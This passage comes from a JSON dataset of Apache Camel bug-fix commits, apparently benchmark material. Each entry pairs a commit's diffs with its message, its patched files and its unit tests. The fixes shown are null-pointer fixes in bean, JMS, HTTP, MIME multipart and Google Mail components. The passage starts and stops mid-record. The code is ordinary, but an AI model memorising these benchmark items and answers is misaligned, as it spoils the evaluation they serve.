                "patch": "@@ -0,0 +1,25 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.bean.issues;\n+\n+public abstract class AbstractTransformer implements Transformer {\n+\n+    protected String getTest() {\n+        return \"test\";\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/AbstractTransformer.java",
                "sha": "0209c2e07425f050ce17a96553cd90815555efc2",
                "status": "added"
            },
            {
                "additions": 25,
                "blob_url": "https://github.com/apache/camel/blob/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/Transformer.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/bean/issues/Transformer.java?ref=597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/bean/issues/Transformer.java",
                "patch": "@@ -0,0 +1,25 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.bean.issues;\n+\n+import org.apache.camel.Exchange;\n+\n+public interface Transformer {\n+\n+    Object transform(Exchange exchange);\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/Transformer.java",
                "sha": "f231e21734f95cbf9c391905c3e2d32fb62ad651",
                "status": "added"
            },
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerImpl.java",
                "changes": 27,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerImpl.java?ref=597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerImpl.java",
                "patch": "@@ -0,0 +1,27 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.bean.issues;\n+\n+import org.apache.camel.Exchange;\n+\n+public class TransformerImpl extends AbstractTransformer {\n+\n+    @Override\n+    public String transform(Exchange exchange) {\n+        return getTest();\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerImpl.java",
                "sha": "b6ccda1aba06cf4447b3790b6f0ee9f80c5f264f",
                "status": "added"
            },
            {
                "additions": 46,
                "blob_url": "https://github.com/apache/camel/blob/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerIssueTest.java",
                "changes": 46,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerIssueTest.java?ref=597883fa57fbd1b4dcc282e9493b5ebfade4b5a7",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerIssueTest.java",
                "patch": "@@ -0,0 +1,46 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.bean.issues;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+\n+/**\n+ * @version \n+ */\n+public class TransformerIssueTest extends ContextTestSupport {\n+\n+    public void testTransformer() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"test\");\n+\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .bean(TransformerImpl.class, \"transform\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/597883fa57fbd1b4dcc282e9493b5ebfade4b5a7/camel-core/src/test/java/org/apache/camel/component/bean/issues/TransformerIssueTest.java",
                "sha": "5137f7155ade711be27b788ca4c05f72d312dd6d",
                "status": "added"
            }
        ],
        "message": "CAMEL-8624: Bean component - Potential NPE in BeanInfo",
        "parent": "https://github.com/apache/camel/commit/7fbf1b95d031ccc69b660ae9491be44954559840",
        "patched_files": [
            "BeanInfo.java",
            "AbstractTransformer.java",
            "Transformer.java",
            "TransformerImpl.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "TransformerIssueTest.java",
            "BeanInfoTest.java"
        ]
    },
    "camel_5ab32ac": {
        "bug_id": "camel_5ab32ac",
        "commit": "https://github.com/apache/camel/commit/5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java?ref=5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7",
                "deletions": 2,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "patch": "@@ -170,8 +170,8 @@ public Object extractBodyFromJms(Exchange exchange, Message message) {\n                 map.put(\"JMSType\", JmsMessageHelper.getJMSType(jmsMessage));\n \n                 // this works around a bug in the ActiveMQ property handling\n-                map.put(JMS_X_GROUP_ID, jmsMessage.getStringProperty(JMS_X_GROUP_ID));\n-                map.put(\"JMSXUserID\", jmsMessage.getStringProperty(\"JMSXUserID\"));\n+                map.put(JMS_X_GROUP_ID, JmsMessageHelper.getStringProperty(jmsMessage, JMS_X_GROUP_ID));\n+                map.put(\"JMSXUserID\", JmsMessageHelper.getStringProperty(jmsMessage, \"JMSXUserID\"));\n             } catch (JMSException e) {\n                 throw new RuntimeCamelException(e);\n             }",
                "raw_url": "https://github.com/apache/camel/raw/5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "sha": "84b20a28fc73da7ff55ff4ad61dde64f2ed8ceb3",
                "status": "modified"
            },
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsMessageHelper.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsMessageHelper.java?ref=5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7",
                "deletions": 0,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsMessageHelper.java",
                "patch": "@@ -300,6 +300,22 @@ public static String getJMSType(Message message) {\n \n         return null;\n     }\n+    \n+    /**\n+     * Gets the String Properties from the message.\n+     *\n+     * @param message  the message\n+     * @return the type, can be <tt>null</tt>\n+     */\n+    public static String getStringProperty(Message message, String propertyName) {\n+        try {\n+            return message.getStringProperty(propertyName);\n+        } catch (Exception e) {\n+            // ignore due some broker client does not support accessing StringProperty\n+        }\n+\n+        return null;\n+    }\n \n     /**\n      * Gets the JMSRedelivered from the message.",
                "raw_url": "https://github.com/apache/camel/raw/5ab32ac3f7aba4eeaf82efb06cc5f01efe0fe0c7/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsMessageHelper.java",
                "sha": "24b6dee28473b8936cfccdb2f7c0d7821220b575",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7449 Avoiding the NPE when using camel-jms with other JMS breaker",
        "parent": "https://github.com/apache/camel/commit/eca064d25a6d785ac0419586da2a78bf6d70daea",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_5b1012e": {
        "bug_id": "camel_5b1012e",
        "commit": "https://github.com/apache/camel/commit/5b1012ef4132bcdc3092287d7fcfcb3af206cefd",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/5b1012ef4132bcdc3092287d7fcfcb3af206cefd/components/camel-http4/src/main/java/org/apache/camel/component/http4/HttpEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-http4/src/main/java/org/apache/camel/component/http4/HttpEndpoint.java?ref=5b1012ef4132bcdc3092287d7fcfcb3af206cefd",
                "deletions": 1,
                "filename": "components/camel-http4/src/main/java/org/apache/camel/component/http4/HttpEndpoint.java",
                "patch": "@@ -132,7 +132,7 @@ protected HttpClient createHttpClient() {\n         clientBuilder.setDefaultCookieStore(cookieStore);\n         // setup the httpConnectionManager\n         clientBuilder.setConnectionManager(clientConnectionManager);\n-        if (getClientConnectionManager() == getComponent().getClientConnectionManager()) {\n+        if (getComponent() != null && getComponent().getClientConnectionManager() == getClientConnectionManager()) {\n             clientBuilder.setConnectionManagerShared(true);\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/5b1012ef4132bcdc3092287d7fcfcb3af206cefd/components/camel-http4/src/main/java/org/apache/camel/component/http4/HttpEndpoint.java",
                "sha": "b589e655e31d8d34619ec0b180d02b6de27079db",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/8c938bc1e0f3eab2425effd94b274effa1b8c431",
        "patched_files": [
            "HttpEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "HttpEndpointTest.java"
        ]
    },
    "camel_5b44c4f": {
        "bug_id": "camel_5b44c4f",
        "commit": "https://github.com/apache/camel/commit/5b44c4fd2d0b9899c8163a39740540733102cffb",
        "file": [
            {
                "additions": 21,
                "blob_url": "https://github.com/apache/camel/blob/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/main/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormat.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/main/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormat.java?ref=5b44c4fd2d0b9899c8163a39740540733102cffb",
                "deletions": 1,
                "filename": "components/camel-mail/src/main/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormat.java",
                "patch": "@@ -20,10 +20,12 @@\n import java.io.IOException;\n import java.io.InputStream;\n import java.io.OutputStream;\n+import java.io.UnsupportedEncodingException;\n import java.util.ArrayList;\n import java.util.Enumeration;\n import java.util.List;\n import java.util.Map;\n+import java.util.UUID;\n import java.util.regex.Pattern;\n \n import javax.activation.DataHandler;\n@@ -236,7 +238,7 @@ public Object unmarshal(Exchange exchange, InputStream stream) throws IOExceptio\n             content = mp.getBodyPart(0);\n             for (int i = 1; i < mp.getCount(); i++) {\n                 BodyPart bp = mp.getBodyPart(i);\n-                camelMessage.addAttachment(MimeUtility.decodeText(bp.getFileName()), bp.getDataHandler());\n+                camelMessage.addAttachment(getAttachmentKey(bp), bp.getDataHandler());\n             }\n         }\n         if (content instanceof BodyPart) {\n@@ -266,4 +268,22 @@ private void extractHeader(String headerMame, Message camelMessage, InternetHead\n             camelMessage.removeHeader(headerMame);\n         }\n     }\n+\n+    private String getAttachmentKey(BodyPart bp) throws MessagingException, UnsupportedEncodingException {\n+        // use the filename as key for the map\n+        String key = bp.getFileName();\n+        // if there is no file name we use the Content-ID header\n+        if (key == null && bp instanceof MimeBodyPart) {\n+            key = ((MimeBodyPart)bp).getContentID();\n+            if (key != null && key.startsWith(\"<\") && key.length() > 2) {\n+                // strip <>\n+                key = key.substring(1, key.length() - 1);\n+            }\n+        }\n+        // or a generated content id\n+        if (key == null) {\n+            key = UUID.randomUUID().toString() + \"@camel.apache.org\";\n+        }\n+        return MimeUtility.decodeText(key);\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/main/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormat.java",
                "sha": "6504bc39f74f6557a52a6bea269d4beb9bfc7816",
                "status": "modified"
            },
            {
                "additions": 30,
                "blob_url": "https://github.com/apache/camel/blob/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormatTest.java",
                "changes": 30,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/test/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormatTest.java?ref=5b44c4fd2d0b9899c8163a39740540733102cffb",
                "deletions": 0,
                "filename": "components/camel-mail/src/test/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormatTest.java",
                "patch": "@@ -17,8 +17,10 @@\n package org.apache.camel.dataformat.mime.multipart;\n \n import java.io.ByteArrayOutputStream;\n+import java.io.File;\n import java.io.IOException;\n import java.io.InputStream;\n+import java.io.UnsupportedEncodingException;\n \n import javax.activation.DataHandler;\n import javax.activation.DataSource;\n@@ -285,6 +287,34 @@ public void marhsalUnmarshalInlineHeaders() throws IOException {\n         assertEquals(\"also there\", out.getOut().getHeader(\"x-bar\"));\n     }\n \n+    @Test\n+    public void unmarshalRelated() throws IOException {\n+        in.setBody(new File(\"src/test/resources/multipart-related.txt\"));\n+        unmarshalAndCheckAttachmentName(\"950120.aaCB@XIson.com\");\n+    }\n+\n+    @Test\n+    public void unmarshalWithoutId() throws IOException {\n+        in.setBody(new File(\"src/test/resources/multipart-without-id.txt\"));\n+        unmarshalAndCheckAttachmentName(\"@camel.apache.org\");\n+    }\n+\n+    private void unmarshalAndCheckAttachmentName(String matcher) throws IOException, UnsupportedEncodingException {\n+        Exchange intermediate = template.send(\"direct:unmarshalonlyinlineheaders\", exchange);\n+        assertNotNull(intermediate.getOut());\n+        String bodyStr = intermediate.getOut().getBody(String.class);\n+        assertNotNull(bodyStr);\n+        assertThat(bodyStr, startsWith(\"25\"));\n+        assertEquals(1, intermediate.getOut().getAttachmentNames().size());\n+        assertThat(intermediate.getOut().getAttachmentNames().iterator().next(), containsString(matcher));\n+        DataHandler dh = intermediate.getOut().getAttachment(intermediate.getOut().getAttachmentNames().iterator().next());\n+        assertNotNull(dh);\n+        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n+        dh.writeTo(bos);\n+        String attachmentString = new String(bos.toByteArray(), \"UTF-8\");\n+        assertThat(attachmentString, startsWith(\"Old MacDonald had a farm\"));\n+    }\n+\n     private void addAttachment(String attContentType, String attText, String attFileName) throws IOException {\n         DataSource ds = new ByteArrayDataSource(attText, attContentType);\n         in.addAttachment(attFileName, new DataHandler(ds));",
                "raw_url": "https://github.com/apache/camel/raw/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/java/org/apache/camel/dataformat/mime/multipart/MimeMultipartDataFormatTest.java",
                "sha": "db62669d272c7757d040e7deca551f6c457b10e1",
                "status": "modified"
            },
            {
                "additions": 29,
                "blob_url": "https://github.com/apache/camel/blob/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/resources/multipart-related.txt",
                "changes": 29,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/test/resources/multipart-related.txt?ref=5b44c4fd2d0b9899c8163a39740540733102cffb",
                "deletions": 0,
                "filename": "components/camel-mail/src/test/resources/multipart-related.txt",
                "patch": "@@ -0,0 +1,29 @@\n+MIME-Version: 1.0\n+Content-Type: Multipart/Related; boundary=example-1; start=\"<950120.aaCC@XIson.com>\"; type=\"Application/X-FixedRecord\"; start-info=\"-o ps\"\n+\n+--example-1\n+Content-Type: Application/X-FixedRecord\n+Content-ID: <950120.aaCC@XIson.com>\n+\n+25\n+10\n+34\n+10\n+25\n+21\n+26\n+10\n+--example-1\n+Content-Type: Application/octet-stream\n+Content-Description: The fixed length records\n+Content-Transfer-Encoding: base64\n+Content-ID: <950120.aaCB@XIson.com>\n+\n+T2xkIE1hY0RvbmFsZCBoYWQgYSBmYXJtCkUgSS\n+BFIEkgTwpBbmQgb24gaGlzIGZhcm0gaGUgaGFk\n+IHNvbWUgZHVja3MKRSBJIEUgSSBPCldpdGggYS\n+BxdWFjayBxdWFjayBoZXJlLAphIHF1YWNrIHF1\n+YWNrIHRoZXJlLApldmVyeSB3aGVyZSBhIHF1YW\n+NrIHF1YWNrCkUgSSBFIEkgTwo=\n+\n+--example-1--\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/resources/multipart-related.txt",
                "sha": "71b9e1c2b03832a765b8e934d742f7c7f16862a2",
                "status": "added"
            },
            {
                "additions": 26,
                "blob_url": "https://github.com/apache/camel/blob/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/resources/multipart-without-id.txt",
                "changes": 26,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mail/src/test/resources/multipart-without-id.txt?ref=5b44c4fd2d0b9899c8163a39740540733102cffb",
                "deletions": 0,
                "filename": "components/camel-mail/src/test/resources/multipart-without-id.txt",
                "patch": "@@ -0,0 +1,26 @@\n+MIME-Version: 1.0\n+Content-Type: Multipart/Mixed; boundary=example-1\n+\n+--example-1\n+Content-Type: Application/X-FixedRecord\n+\n+25\n+10\n+34\n+10\n+25\n+21\n+26\n+10\n+--example-1\n+Content-Type: Application/octet-stream\n+Content-Transfer-Encoding: base64\n+\n+T2xkIE1hY0RvbmFsZCBoYWQgYSBmYXJtCkUgSS\n+BFIEkgTwpBbmQgb24gaGlzIGZhcm0gaGUgaGFk\n+IHNvbWUgZHVja3MKRSBJIEUgSSBPCldpdGggYS\n+BxdWFjayBxdWFjayBoZXJlLAphIHF1YWNrIHF1\n+YWNrIHRoZXJlLApldmVyeSB3aGVyZSBhIHF1YW\n+NrIHF1YWNrCkUgSSBFIEkgTwo=\n+\n+--example-1--\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/5b44c4fd2d0b9899c8163a39740540733102cffb/components/camel-mail/src/test/resources/multipart-without-id.txt",
                "sha": "b7728786db437de0d8fe010e95506804678eb56f",
                "status": "added"
            }
        ],
        "message": "CAMEL-9841: NPE in MIME-Multipart Data Format if no file name is defined on attachment. Thanks to Stephan Siano for the patch.",
        "parent": "https://github.com/apache/camel/commit/f1aee991d0f77272baf2ea66ef820a25e35bab70",
        "patched_files": [
            "multipart-related.java",
            "MimeMultipartDataFormat.java",
            "multipart-without-id.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MimeMultipartDataFormatTest.java"
        ]
    },
    "camel_5d79ddc": {
        "bug_id": "camel_5d79ddc",
        "commit": "https://github.com/apache/camel/commit/5d79ddc352d5a5266d359dc1c2a597184343abd4",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/5d79ddc352d5a5266d359dc1c2a597184343abd4/components-starter/pom.xml",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components-starter/pom.xml?ref=5d79ddc352d5a5266d359dc1c2a597184343abd4",
                "deletions": 0,
                "filename": "components-starter/pom.xml",
                "patch": "@@ -77,12 +77,14 @@\n     <module>camel-beanio-starter</module>\n     <module>camel-beanstalk-starter</module>\n     <module>camel-bindy-starter</module>\n+    <module>camel-blueprint-starter</module>\n     <module>camel-boon-starter</module>\n     <module>camel-box-starter</module>\n     <module>camel-braintree-starter</module>\n     <module>camel-cache-starter</module>\n     <module>camel-cassandraql-starter</module>\n     <module>camel-castor-starter</module>\n+    <module>camel-cdi-starter</module>\n     <module>camel-chronicle-starter</module>\n     <module>camel-chunk-starter</module>\n     <module>camel-cm-sms-starter</module>\n@@ -105,6 +107,7 @@\n     <module>camel-dropbox-starter</module>\n     <module>camel-eclipse-starter</module>\n     <module>camel-ehcache-starter</module>\n+    <module>camel-ejb-starter</module>\n     <module>camel-elasticsearch-starter</module>\n     <module>camel-elsql-starter</module>\n     <module>camel-etcd-starter</module>\n@@ -140,6 +143,7 @@\n     <module>camel-http-starter</module>\n     <module>camel-http4-starter</module>\n     <module>camel-hystrix-starter</module>\n+    <module>camel-ibatis-starter</module>\n     <module>camel-ical-starter</module>\n     <module>camel-ignite-starter</module>\n     <module>camel-infinispan-starter</module>\n@@ -153,6 +157,7 @@\n     <module>camel-jaxb-starter</module>\n     <module>camel-jbpm-starter</module>\n     <module>camel-jcache-starter</module>\n+    <module>camel-jclouds-starter</module>\n     <module>camel-jcr-starter</module>\n     <module>camel-jdbc-starter</module>\n     <module>camel-jetty-common-starter</module>\n@@ -210,6 +215,7 @@\n     <module>camel-pgevent-starter</module>\n     <module>camel-printer-starter</module>\n     <module>camel-protobuf-starter</module>\n+    <module>camel-quartz-starter</module>\n     <module>camel-quartz2-starter</module>\n     <module>camel-quickfix-starter</module>\n     <module>camel-rabbitmq-starter</module>\n@@ -239,6 +245,7 @@\n     <module>camel-snmp-starter</module>\n     <module>camel-soap-starter</module>\n     <module>camel-solr-starter</module>\n+    <module>camel-spark-rest-starter</module>\n     <module>camel-spark-starter</module>\n     <module>camel-splunk-starter</module>\n     <module>camel-spring-batch-starter</module>\n@@ -262,6 +269,8 @@\n     <module>camel-tagsoup-starter</module>\n     <module>camel-tarfile-starter</module>\n     <module>camel-telegram-starter</module>\n+    <module>camel-test-starter</module>\n+    <module>camel-testng-starter</module>\n     <module>camel-twitter-starter</module>\n     <module>camel-undertow-starter</module>\n     <module>camel-univocity-parsers-starter</module>",
                "raw_url": "https://github.com/apache/camel/raw/5d79ddc352d5a5266d359dc1c2a597184343abd4/components-starter/pom.xml",
                "sha": "4aca1b46e4e92e09291e771b891b2fdd2d61fa8f",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailComponent.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailComponent.java?ref=5d79ddc352d5a5266d359dc1c2a597184343abd4",
                "deletions": 3,
                "filename": "components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailComponent.java",
                "patch": "@@ -45,10 +45,11 @@ protected GoogleMailApiName getApiName(String apiNameStr) throws IllegalArgument\n         return GoogleMailApiName.fromValue(apiNameStr);\n     }\n \n-    public Gmail getClient() {\n+    public Gmail getClient(GoogleMailConfiguration googleMailConfiguration) {\n         if (client == null) {\n-            client = getClientFactory().makeClient(configuration.getClientId(), configuration.getClientSecret(), configuration.getScopes(), configuration.getApplicationName(),\n-                    configuration.getRefreshToken(), configuration.getAccessToken());\n+            client = getClientFactory().makeClient(googleMailConfiguration.getClientId(), googleMailConfiguration.getClientSecret(), \n+                    googleMailConfiguration.getScopes(), googleMailConfiguration.getApplicationName(),\n+                    googleMailConfiguration.getRefreshToken(), googleMailConfiguration.getAccessToken());\n         }\n         return client;\n     }\n@@ -70,6 +71,9 @@ public void setConfiguration(GoogleMailConfiguration configuration) {\n \n     @Override\n     public GoogleMailConfiguration getConfiguration() {\n+        if (configuration == null) {\n+            configuration = new GoogleMailConfiguration();\n+        }\n         return super.getConfiguration();\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailComponent.java",
                "sha": "7871a515591b30a966a13e5377513f51af592d4f",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailEndpoint.java?ref=5d79ddc352d5a5266d359dc1c2a597184343abd4",
                "deletions": 1,
                "filename": "components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailEndpoint.java",
                "patch": "@@ -107,7 +107,7 @@ protected void afterConfigureProperties() {\n     }\n \n     public Gmail getClient() {\n-        return ((GoogleMailComponent) getComponent()).getClient();\n+        return ((GoogleMailComponent) getComponent()).getClient(configuration);\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/main/java/org/apache/camel/component/google/mail/GoogleMailEndpoint.java",
                "sha": "7810839e9b63cc08a173ed62cd23f8a33a73da19",
                "status": "modified"
            },
            {
                "additions": 73,
                "blob_url": "https://github.com/apache/camel/blob/5d79ddc352d5a5266d359dc1c2a597184343abd4/components/camel-google-mail/src/test/java/org/apache/camel/component/google/mail/GmailConfigurationTest.java",
                "changes": 73,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-google-mail/src/test/java/org/apache/camel/component/google/mail/GmailConfigurationTest.java?ref=5d79ddc352d5a5266d359dc1c2a597184343abd4",
                "deletions": 0,
                "filename": "components/camel-google-mail/src/test/java/org/apache/camel/component/google/mail/GmailConfigurationTest.java",
                "patch": "@@ -0,0 +1,73 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.google.mail;\n+\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.google.mail.internal.GmailUsersMessagesApiMethod;\n+import org.apache.camel.component.google.mail.internal.GoogleMailApiCollection;\n+import org.apache.camel.impl.DefaultCamelContext;\n+import org.junit.Test;\n+import org.slf4j.Logger;\n+import org.slf4j.LoggerFactory;\n+\n+/**\n+ * Test class for {@link com.google.api.services.gmail.Gmail$Users$Messages}\n+ * APIs.\n+ */\n+public class GmailConfigurationTest extends AbstractGoogleMailTestSupport {\n+\n+    // userid of the currently authenticated user\n+    public static final String CURRENT_USERID = \"me\";\n+    private static final Logger LOG = LoggerFactory.getLogger(GmailConfigurationTest.class);\n+    private static final String PATH_PREFIX = GoogleMailApiCollection.getCollection().getApiName(GmailUsersMessagesApiMethod.class).getName();\n+    private static final String TEST_URI = \"google-mail://\" + PATH_PREFIX + \"/send?clientId=a&clientSecret=b&applicationName=c&accessToken=d&refreshToken=e\";\n+\n+    @Override\n+    protected CamelContext createCamelContext() throws Exception {\n+        final CamelContext context = new DefaultCamelContext(createRegistry());\n+\n+        // add GoogleMailComponent to Camel context but don't set up configuration\n+        final 